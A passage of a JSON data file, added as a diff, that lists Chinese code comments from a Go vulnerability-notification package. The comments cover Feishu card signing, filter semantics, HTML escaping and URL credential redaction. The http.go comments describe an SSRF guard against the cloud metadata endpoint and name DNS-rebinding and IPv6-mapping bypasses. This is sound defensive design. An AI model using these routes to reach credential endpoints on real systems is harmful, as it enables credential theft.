+    "Start": 419,
+    "End": 536,
+    "Line": 20,
+    "Text": "//   - 卡片 header 支持颜色模板，用级别映射配色，让人在消息列表里一眼看出严重程度。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 624,
+    "End": 691,
+    "Line": 25,
+    "Text": "// 飞书自定义机器人约 5 次/秒，折合 100 次/分钟。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 753,
+    "End": 815,
+    "Line": 28,
+    "Text": "// Webhook 地址末段即机器人唯一标识，属凭据。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 901,
+    "End": 976,
+    "Line": 31,
+    "Text": "// 同理：改 Webhook 地址必须对新地址重新表态签名密钥。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 1606,
+    "End": 1677,
+    "Line": 54,
+    "Text": "// 加签参数与消息同层，且只在配置了 secret 时出现。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 2041,
+    "End": 2107,
+    "Line": 67,
+    "Text": "// 部分版本的飞书 hook 用这套字段名，一并兼容。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 2599,
+    "End": 2649,
+    "Line": 83,
+    "Text": "// feishuSign 按飞书官方规则计算签名。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 2653,
+    "End": 2698,
+    "Line": 85,
+    "Text": "// 这里特别容易踩坑：官方样例是"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 2760,
+    "End": 2849,
+    "Line": 89,
+    "Text": "// 也就是 **key = timestamp + \"\\n\" + secret，message 为空**，而不是直觉上的"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 2850,
+    "End": 2954,
+    "Line": 90,
+    "Text": "// 「key=secret, message=stringToSign」——那正是钉钉的算法。两边算法刚好反过来，"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 2955,
+    "End": 3027,
+    "Line": 91,
+    "Text": "// 照着另一家的实现写必然签名校验失败（报 19021）。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 3232,
+    "End": 3311,
+    "Line": 98,
+    "Text": "// feishuSeverityTemplate 把漏洞级别映射到卡片 header 配色模板。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 3312,
+    "End": 3378,
+    "Line": 99,
+    "Text": "// 未知级别用 grey——不用 blue，免得和 low 混淆。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 3612,
+    "End": 3721,
+    "Line": 115,
+    "Text": "// feishuMaxCardBytes 是卡片内容的保守上限。飞书对卡片有体积限制，超了整条被拒；"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 3722,
+    "End": 3803,
+    "Line": 116,
+    "Text": "// 取一个明显低于官方上限的值，把 JSON 包装开销也算进来。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 3838,
+    "End": 3922,
+    "Line": 119,
+    "Text": "// feishuCard 构造交互式卡片，返回卡片与**实际写入的条目数**。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 3923,
+    "End": 4022,
+    "Line": 120,
+    "Text": "// kept 的用途同 markdownBody：只有真正进了卡片的条目才该被标记为已送达。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 4122,
+    "End": 4218,
+    "Line": 125,
+    "Text": "// 先按整条打包再拼头部：头部要写「其余 N 条将在下一条消息继续」，"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 4221,
+    "End": 4262,
+    "Line": 126,
+    "Text": "// N 必须来自实际装下的条数。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 5777,
+    "End": 5835,
+    "Line": 174,
+    "Text": "// feishuItemLines 渲染单个漏洞的 lark_md 正文。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 5839,
+    "End": 5941,
+    "Line": 176,
+    "Text": "// lark_md 与 markdown 是同族的文本格式，同样会解析链接与强调，所以来自外部"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 5942,
+    "End": 6039,
+    "Line": 177,
+    "Text": "// 的字段一律过 markdownText（单行化 + 转义）——否则一条漏洞标题就能在"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 6040,
+    "End": 6079,
+    "Line": 178,
+    "Text": "// 飞书里变成可点击的外链。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 6790,
+    "End": 6842,
+    "Line": 199,
+    "Text": "// feishuBatchLine 渲染汇总卡片里的一条。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 73,
+    "End": 174,
+    "Line": 10,
+    "Text": "// Filter 是 notification_channels.filter 这一 JSONB 列的契约：渠道实例的过滤条件。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 175,
+    "End": 289,
+    "Line": 11,
+    "Text": "// 所有字段都可选，缺省即「不过滤」——这正是畸形配置的兜底语义，见 ParseFilter。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 312,
+    "End": 400,
+    "Line": 13,
+    "Text": "// MinSeverity 是最低级别门槛（low/medium/high/critical），空=不设门槛。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 444,
+    "End": 532,
+    "Line": 15,
+    "Text": "// TaskIDs / AssetIDs 为空数组表示不限；非空则要求事件与它有交集。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 607,
+    "End": 704,
+    "Line": 18,
+    "Text": "// VulnClassInclude 为空表示全收；非空则要求 vulnclass 命中其中任一关键词。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 706,
+    "End": 786,
+    "Line": 19,
+    "Text": "// VulnClassExclude 命中任一关键词即排除（排除优先于包含）。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 788,
+    "End": 905,
+    "Line": 20,
+    "Text": "// 匹配方式为大小写不敏感的子串——比正则安全：用户配错正则不会让渠道静默失效。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 1015,
+    "End": 1121,
+    "Line": 23,
+    "Text": "// OnStatusChange 决定该渠道是否接收漏洞状态变更事件（仅 realtime 模式有意义）。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 1172,
+    "End": 1214,
+    "Line": 27,
+    "Text": "// ParseFilter 解析渠道过滤配置。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 1218,
+    "End": 1325,
+    "Line": 29,
+    "Text": "// **永不返回 error。** 这是刻意的设计选择：过滤条件配置畸形时一律退化为零值"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 1326,
+    "End": 1435,
+    "Line": 30,
+    "Text": "// Filter（= 不过滤 = 全部命中），因为对一个漏洞通知系统来说，**多推一条远好过"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 1436,
+    "End": 1549,
+    "Line": 31,
+    "Text": "// 静默漏掉一条高危**。让解析失败变成「不推送」，等于给用户一个看起来配好了、"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 1550,
+    "End": 1619,
+    "Line": 32,
+    "Text": "// 实际什么都不推的渠道——这是最糟的失败模式。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 1707,
+    "End": 1758,
+    "Line": 38,
+    "Text": "// 解析失败时 f 保持零值，即不过滤。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 1801,
+    "End": 1893,
+    "Line": 43,
+    "Text": "// ValidMinSeverity 报告 s 是否为合法的级别门槛（空串表示不设门槛）。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 2004,
+    "End": 2092,
+    "Line": 52,
+    "Text": "// Validate 校验过滤配置里**取值受限**的字段，供保存渠道时调用。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 2096,
+    "End": 2195,
+    "Line": 54,
+    "Text": "// 为什么必须在写入时拦：Match 对未知门槛的判定是 `rank >= 0`，恒为真——"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 2196,
+    "End": 2289,
+    "Line": 55,
+    "Text": "// 也就是说 min_severity 打错一个字（\"hgih\"），过滤器会**静默失效**变成"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 2290,
+    "End": 2389,
+    "Line": 56,
+    "Text": "// 「全推」。这与本包「宁可多推不可漏推」的取舍方向一致（不会漏），"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 2390,
+    "End": 2480,
+    "Line": 57,
+    "Text": "// 但后果是用户以为自己在做分级推送、实际把全部漏洞灌进群里，"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 2481,
+    "End": 2583,
+    "Line": 58,
+    "Text": "// 而且没有任何迹象提示他配错了。这类「静默降级」正应该在入口处拦掉。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 2587,
+    "End": 2683,
+    "Line": 60,
+    "Text": "// 注意 Validate 只用于**写入**路径。读取路径仍走 ParseFilter 的宽容语义，"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 2684,
+    "End": 2765,
+    "Line": 61,
+    "Text": "// 这样历史数据里已经存在的坏值不会让渠道整个读不出来。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 2992,
+    "End": 3070,
+    "Line": 69,
+    "Text": "// Match 判定一个事件是否应投递到带有该过滤条件的渠道。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 3074,
+    "End": 3171,
+    "Line": 71,
+    "Text": "// **永不返回 error**，理由同 ParseFilter：任何内部异常都按「命中」处理。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 3172,
+    "End": 3272,
+    "Line": 72,
+    "Text": "// 判定顺序：事件类型 → 级别门槛 → 任务/资产范围 → 漏洞类型关键词。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 3314,
+    "End": 3413,
+    "Line": 74,
+    "Text": "// 状态变更事件只有显式开启的渠道才接收。默认关，因为绝大多数使用者"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 3415,
+    "End": 3520,
+    "Line": 75,
+    "Text": "// 期望「推送」指的是「发现新漏洞」，而不是流水账式地跟进每个状态流转。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 3833,
+    "End": 3926,
+    "Line": 88,
+    "Text": "// 排除优先：命中任一排除关键词即出局，即便同时命中了包含列表。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 4193,
+    "End": 4280,
+    "Line": 99,
+    "Text": "// 小集合线性扫描即可；两边的量级都是「人手勾选的几十个」，"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 4282,
+    "End": 4317,
+    "Line": 100,
+    "Text": "// 建 map 的开销大于收益。"
+  },
+  {
+    "path": "source/notify/filter.go",
+    "Start": 4409,
+    "End": 4504,
+    "Line": 109,
+    "Text": "// containsAnyFold 报告 s 是否包含 keywords 中任一关键词（大小写不敏感）。"
+  },
+  {
+    "path": "source/notify/filter_test.go",
+    "Start": 100,
+    "End": 193,
+    "Line": 6,
+    "Text": "// 畸形 JSON、空输入、类型不对的字段——全部必须退化为零值 Filter，"
+  },
+  {
+    "path": "source/notify/filter_test.go",
+    "Start": 195,
+    "End": 279,
+    "Line": 7,
+    "Text": "// 即「不过滤」。这条不变量是「宁可多推不可漏推」的落点："
+  },
+  {
+    "path": "source/notify/filter_test.go",
+    "Start": 281,
+    "End": 386,
+    "Line": 8,
+    "Text": "// 一旦这里改成报错或半解析，用户配错一个字符就会静默丢掉所有高危通知。"
+  },
+  {
+    "path": "source/notify/filter_test.go",
+    "Start": 894,
+    "End": 938,
+    "Line": 25,
+    "Text": "// 零值 Filter 必须命中任意事件。"
+  },
+  {
+    "path": "source/notify/filter_test.go",
+    "Start": 1550,
+    "End": 1633,
+    "Line": 51,
+    "Text": "// 未知级别序数为 0，应被任何非空门槛挡住（存疑时不推）。"
+  },
+  {
+    "path": "source/notify/filter_test.go",
+    "Start": 3810,
+    "End": 3867,
+    "Line": 112,
+    "Text": "// 排除优先于包含：同时命中时应当出局。"
+  },
+  {
+    "path": "source/notify/filter_test.go",
+    "Start": 4011,
+    "End": 4107,
+    "Line": 117,
+    "Text": "// 纯空白关键词应被忽略，否则会退化成「匹配所有含空格的字符串」。"
+  },
+  {
+    "path": "source/notify/filter_test.go",
+    "Start": 4577,
+    "End": 4676,
+    "Line": 131,
+    "Text": "// 默认关：绝大多数人说的「推送漏洞」指发现新漏洞，不是状态流水账。"
+  },
+  {
+    "path": "source/notify/filter_test.go",
+    "Start": 4902,
+    "End": 4950,
+    "Line": 138,
+    "Text": "// 创建事件不受 on_status_change 影响。"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 46,
+    "End": 152,
+    "Line": 8,
+    "Text": "// 本文件渲染邮件的 HTML 正文。刻意用内联样式 + 简单表格布局而不是现代 CSS："
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 153,
+    "End": 251,
+    "Line": 9,
+    "Text": "// 邮件客户端（尤其 Outlook 与国内企业邮箱）对 <style> 块和 flex/grid 的支持"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 252,
+    "End": 330,
+    "Line": 10,
+    "Text": "// 差异极大，内联样式是唯一在各家都能正确显示的写法。"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 332,
+    "End": 416,
+    "Line": 12,
+    "Text": "// htmlSeverityColor 返回级别对应的强调色，用于左侧色条与标题。"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 657,
+    "End": 691,
+    "Line": 28,
+    "Text": "// htmlTitle 返回邮件主题。"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 755,
+    "End": 823,
+    "Line": 33,
+    "Text": "// htmlBody 渲染邮件正文 HTML。maxRunes<=0 表示不截断。"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 1508,
+    "End": 1577,
+    "Line": 52,
+    "Text": "// htmlBatchIntro 渲染汇总邮件开头：条数与级别分布。"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 2413,
+    "End": 2498,
+    "Line": 77,
+    "Text": "// htmlItem 渲染单个漏洞。full=true 时含摘要与回链（单条推送），"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 2499,
+    "End": 2547,
+    "Line": 78,
+    "Text": "// false 时压缩成一行（汇总列表）。"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 4224,
+    "End": 4322,
+    "Line": 125,
+    "Text": "// htmlEscape 转义 HTML 文本内容。漏洞标题与摘要来自被测目标与模型输出，"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 4323,
+    "End": 4430,
+    "Line": 126,
+    "Text": "// 是不可信内容——不转义就等于允许把任意 HTML（含外链图片）注入到邮件里。"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 4600,
+    "End": 4684,
+    "Line": 134,
+    "Text": "// htmlEscapeAttr 转义 HTML 属性值（在文本转义之外额外处理引号，"
+  },
+  {
+    "path": "source/notify/html.go",
+    "Start": 4685,
+    "End": 4741,
+    "Line": 135,
+    "Text": "// 防止 URL 里的引号提前闭合 href 属性）。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 154,
+    "End": 241,
+    "Line": 19,
+    "Text": "// allowLocalTargets 决定是否允许把消息投递到环回 / 链路本地地址。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 245,
+    "End": 354,
+    "Line": 21,
+    "Text": "// 默认拒绝。这几段地址不是 IM 机器人或公网邮件服务器会出现的地方，而它们能"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 355,
+    "End": 457,
+    "Line": 22,
+    "Text": "// 打到的东西很敏感：同机另一个服务的管理端口、以及云环境的元数据端点"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 458,
+    "End": 563,
+    "Line": 23,
+    "Text": "// （169.254.169.254，可读出实例凭据）。投递地址是管理员配的，但一个被 XSS/CSRF"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 564,
+    "End": 671,
+    "Line": 24,
+    "Text": "// 借用的管理会话、或共用同一 JWT 的第二个人，都能靠改配置把响应内容读回来"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 672,
+    "End": 770,
+    "Line": 25,
+    "Text": "// ——doJSON 会把 4xx/5xx 的响应体前 200 字节写进 last_error，而投递历史接口"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 771,
+    "End": 831,
+    "Line": 26,
+    "Text": "// 会把它回显出来，这就是一条半盲读原语。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 835,
+    "End": 931,
+    "Line": 28,
+    "Text": "// 但「本机 SMTP 中继」（127.0.0.1:25 上的 postfix）是自建邮件的常见配置，"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 932,
+    "End": 1019,
+    "Line": 29,
+    "Text": "// 一刀切会把人卡住。所以留一个显式逃生口而不是硬编码放行："
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 1020,
+    "End": 1069,
+    "Line": 30,
+    "Text": "// 设置 ARTEX_NOTIFY_ALLOW_LOCAL=1 即允许。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 1073,
+    "End": 1175,
+    "Line": 32,
+    "Text": "// 导出为 AllowLocalTargetsEnv 是为了让测试能明确地打开它——本包与 server 包的"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 1176,
+    "End": 1275,
+    "Line": 33,
+    "Text": "// 用例大量使用 127.0.0.1 上的 httptest 假接收端，不打开就全部被守卫拦下。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 1474,
+    "End": 1563,
+    "Line": 41,
+    "Text": "// isBlockedDialIP 报告目标 IP 是否属于「默认不允许投递」的地址段。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 1567,
+    "End": 1661,
+    "Line": 43,
+    "Text": "// 只拒绝环回、链路本地（含云元数据 169.254.169.254）、未指定与组播。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 1662,
+    "End": 1763,
+    "Line": 44,
+    "Text": "// **不拒绝** RFC1918 私网：内网自建 Mattermost / SMTP 中继是很常见的合法用法，"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 1764,
+    "End": 1866,
+    "Line": 45,
+    "Text": "// 把它们一并挡掉会让功能在真实环境里直接不可用。这条取舍是刻意的——"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 1867,
+    "End": 1951,
+    "Line": 46,
+    "Text": "// 防护要挡住真正敏感的目标，同时不能把正常部署一起废掉。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 2025,
+    "End": 2114,
+    "Line": 51,
+    "Text": "// IPv4-mapped IPv6（::ffff:127.0.0.1）要还原成 IPv4 再判，否则绕过检查。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 2321,
+    "End": 2413,
+    "Line": 59,
+    "Text": "// blockInternalDial 是 http.Transport 拨号器的 Control 钩子，在**连接建立时**"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 2414,
+    "End": 2438,
+    "Line": 60,
+    "Text": "// 检查目标地址。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 2442,
+    "End": 2541,
+    "Line": 62,
+    "Text": "// 为什么设在拨号阶段而不是只在保存配置时校验：这里才是最终生效点。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 2542,
+    "End": 2645,
+    "Line": 63,
+    "Text": "// 它同时覆盖两种绕过配置校验的情形——DNS 重绑定（校验时解析到公网 IP、"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 2646,
+    "End": 2754,
+    "Line": 64,
+    "Text": "// 真正连接时解析到内网）与重定向（虽然我们已拒绝跨主机跳转，但同主机跳转"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 2755,
+    "End": 2794,
+    "Line": 65,
+    "Text": "// 仍可能把路径指到别处）。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 3290,
+    "End": 3368,
+    "Line": 84,
+    "Text": "// notifyTransport 在默认 Transport 的基础上只加一个拨号守卫。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 3369,
+    "End": 3457,
+    "Line": 85,
+    "Text": "// 用 Clone 保留默认的全部调优（连接池、HTTP/2、超时、proxy 等），"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 3458,
+    "End": 3512,
+    "Line": 86,
+    "Text": "// 避免为了加一个检查而改动其它行为。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 3791,
+    "End": 3847,
+    "Line": 97,
+    "Text": "// httpClient 是所有渠道投递共用的客户端。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 3851,
+    "End": 3958,
+    "Line": 99,
+    "Text": "// 刻意**不**复用项目的全局出口代理（server 侧的 GlobalProxy）：那个代理是给渗透"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 3959,
+    "End": 4070,
+    "Line": 100,
+    "Text": "// 目标流量用的，常是不稳定的隧道，而通知的可用性不该被目标网络的抖动绑架。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 4071,
+    "End": 4177,
+    "Line": 101,
+    "Text": "// IM 推送直连即可。超时设为 15 秒——比这更慢的对端实际上已经是故障状态。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 4181,
+    "End": 4289,
+    "Line": 103,
+    "Text": "// 拒绝跨主机重定向：本功能的投递地址都是「一个固定 endpoint」形态，正常不会"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 4290,
+    "End": 4397,
+    "Line": 104,
+    "Text": "// 重定向到别的主机；而这几家的凭据（钉钉的 access_token、企微的 key、Telegram 的"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 4398,
+    "End": 4503,
+    "Line": 105,
+    "Text": "// bot token）**就在 URL 里**，跟随跨主机跳转等于把凭据交给重定向目标。同主机"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 4504,
+    "End": 4552,
+    "Line": 106,
+    "Text": "// 的跳转（如末尾补斜杠）仍允许。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 4954,
+    "End": 5064,
+    "Line": 121,
+    "Text": "// respBodyLimit 限制读取响应体的大小。对端异常时可能吐回超大内容，而我们只需要"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 5065,
+    "End": 5134,
+    "Line": 122,
+    "Text": "// 错误码和一小段错误描述用于展示在投递历史里。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 5166,
+    "End": 5230,
+    "Line": 125,
+    "Text": "// doJSON 发送一次请求并返回响应体（已限长）。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 5234,
+    "End": 5323,
+    "Line": 127,
+    "Text": "// payload 为 nil 时发送空 body（用于 GET 或平台不要求 body 的场景）。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 5324,
+    "End": 5401,
+    "Line": 128,
+    "Text": "// headers 里的键值原样附加，用于通用 Webhook 的自定义头。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 5405,
+    "End": 5508,
+    "Line": 130,
+    "Text": "// 错误分类是这个函数的核心职责：网络层失败与 5xx/408/429 归为「可重试」，"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 5509,
+    "End": 5612,
+    "Line": 131,
+    "Text": "// 其余 4xx 归为「永久失败」——重试一个 403 只是把同一个错误刷 3 遍日志。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 5822,
+    "End": 5910,
+    "Line": 137,
+    "Text": "// 序列化失败是本地 bug（配置字段类型不对），重试也不会变好。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 6109,
+    "End": 6185,
+    "Line": 144,
+    "Text": "// URL 非法——多半是用户把地址填错了，属于永久失败。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 6188,
+    "End": 6268,
+    "Line": 145,
+    "Text": "// 这里同样不能透传 err：url.Parse 的错误文本里含完整地址。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 6560,
+    "End": 6645,
+    "Line": 156,
+    "Text": "// 连接被拒、DNS 失败、超时——多为瞬时故障，交给退避重试。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 6653,
+    "End": 6748,
+    "Line": 158,
+    "Text": "// 错误文本必须脱敏后再往外传。原因：http.Client.Do 返回的是 *url.Error，"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 6751,
+    "End": 6854,
+    "Line": 159,
+    "Text": "// 它的 Error() 是 `Op \"完整URL\": 底层错误`，而本功能这几家的凭据**就在 URL 里**"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 6857,
+    "End": 6942,
+    "Line": 160,
+    "Text": "// （钉钉 access_token、企微 key、飞书 hook id、Telegram /bot<token>/）。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 6945,
+    "End": 7040,
+    "Line": 161,
+    "Text": "// 不脱敏的话，凭据会顺着这条错误串流到四个地方：notification_deliveries"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 7043,
+    "End": 7148,
+    "Line": 162,
+    "Text": "// 的 last_error（明文落库）、投递历史接口的响应（**绕过渠道配置的掩码**）、"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 7151,
+    "End": 7225,
+    "Line": 163,
+    "Text": "// 服务端日志、以及测试发送接口回给前端的 502 文本。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 7563,
+    "End": 7671,
+    "Line": 174,
+    "Text": "// 429（限流）与 408（超时）值得重试；其余 4xx 是配置或权限问题，重试无意义。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8112,
+    "End": 8222,
+    "Line": 184,
+    "Text": "// snippet 把响应体压成一行短文本，用于错误信息。响应里可能带换行与大量空白，"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8223,
+    "End": 8289,
+    "Line": 185,
+    "Text": "// 直接塞进 last_error 会让投递历史页面排版崩掉。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8361,
+    "End": 8452,
+    "Line": 190,
+    "Text": "// redactRequestTarget 把投递地址压成「scheme://host/…」，用于错误信息。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8456,
+    "End": 8557,
+    "Line": 192,
+    "Text": "// 这是本包唯一的地址脱敏口径，刻意做得**足够粗暴**：除了 scheme 与 host，"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8558,
+    "End": 8668,
+    "Line": 193,
+    "Text": "// 其余一律丢弃。原因是没有一个「通用且安全」的方式判断 URL 的哪一段是凭据："
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8672,
+    "End": 8733,
+    "Line": 195,
+    "Text": "//\t钉钉   凭据在 query      /robot/send?access_token=xxx"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8734,
+    "End": 8796,
+    "Line": 196,
+    "Text": "//\t企微   凭据在 query      /cgi-bin/webhook/send?key=xxx"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8797,
+    "End": 8867,
+    "Line": 197,
+    "Text": "//\t飞书   凭据在**路径末段** /open-apis/bot/v2/hook/<hook_id>"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8868,
+    "End": 8929,
+    "Line": 198,
+    "Text": "//\tTelegram 凭据在**路径中段** /bot<token>/sendMessage"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 8933,
+    "End": 9041,
+    "Line": 200,
+    "Text": "// 想「只保留有用部分」就得按渠道打补丁，而漏掉任何一家就是一次凭据泄露。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 9042,
+    "End": 9142,
+    "Line": 201,
+    "Text": "// 保留 host 已经够用于排查（DNS 解析不了、连不上、证书不对都能定位），"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 9143,
+    "End": 9218,
+    "Line": 202,
+    "Text": "// 具体是哪个机器人由渠道配置里的掩码尾号提示去认。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 9222,
+    "End": 9300,
+    "Line": 204,
+    "Text": "// 解析失败时返回固定占位符——绝不把原始串回显出去。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 9488,
+    "End": 9572,
+    "Line": 213,
+    "Text": "// redactTransportError 从传输层错误里剥掉地址，只保留底层原因。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 9576,
+    "End": 9657,
+    "Line": 215,
+    "Text": "// *url.Error 的结构是 {Op, URL, Err}，Error() 会把 URL 一起打出来。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 9658,
+    "End": 9756,
+    "Line": 216,
+    "Text": "// 这里显式取 Err 字段，绕开它的 Error() ——比事后做字符串替换更可靠，"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 9757,
+    "End": 9838,
+    "Line": 217,
+    "Text": "// 因为替换要正确应对 URL 编码/转义后的各种变体，容易漏。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 10178,
+    "End": 10273,
+    "Line": 230,
+    "Text": "// 非 *url.Error（如重定向策略返回的错误）也可能带地址，统一走脱敏。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 10315,
+    "End": 10401,
+    "Line": 234,
+    "Text": "// redactURLsInText 把一段文本里出现的 http(s) 地址替换成脱敏形态。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 10405,
+    "End": 10522,
+    "Line": 236,
+    "Text": "// 用于兜底那些拿不到结构化字段的错误（重定向策略错误、第三方库的自定义错误）。"
+  },
+  {
+    "path": "source/notify/http.go",
+    "Start": 10523,
+    "End": 10622,
+    "Line": 237,
+    "Text": "// 只识别 http/https 前缀，按空白与引号切分——地址不会包含这两类字符。"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 105,
+    "End": 158,
